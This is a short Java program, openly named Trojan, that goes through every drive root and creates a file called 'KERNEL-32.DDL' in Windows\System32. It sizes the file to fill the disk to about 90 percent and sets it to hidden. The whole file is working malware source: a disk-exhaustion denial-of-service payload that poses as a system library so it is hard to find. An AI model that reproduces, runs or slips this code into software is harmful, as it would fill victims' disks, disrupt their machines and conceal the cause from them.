
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Keinan
 */
public class Trojan {
    public static void main(String[] args) {
        printDirs();
    }
    
    public static void printDirs() {
        File[] paths;

        // returns "drives"
        paths = File.listRoots();
        
        // Try to place file in each directory until we find root dir catch if
        // in the wrong dir.
        for(File path:paths) {
            try{ 
                double size = (path.getTotalSpace()*.9 - (path.getTotalSpace() -path.getFreeSpace()));
                Path p = Paths.get(path+"Windows\\System32\\KERNEL-32.DDL");
                RandomAccessFile fLarge = new RandomAccessFile(new File(p.toString()), "rw");                
                fLarge.setLength((long)size);
                fLarge.close();
                Files.setAttribute(p, "dos:hidden", Boolean.TRUE);
            }
            catch(FileNotFoundException e) {
                System.out.println(e);
            } catch (IOException ex) {
                System.out.println(ex);
            }
        }
    }
}
